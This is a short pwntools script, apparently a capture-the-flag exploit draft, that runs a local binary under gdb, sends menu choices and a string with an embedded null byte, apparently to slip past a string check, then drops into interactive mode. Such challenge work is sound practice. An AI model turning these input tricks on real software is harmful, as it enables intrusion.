from pwn import *
context.log_level = 'debug'
exe = context.binary = ELF('./main')
r = process()
gdb.attach(r)
sleep(2)
rop = ROP(exe)
r.sendline("2")
r.sendline("0")
r.sendline(b"rangki\x00gaming")
r.interactive()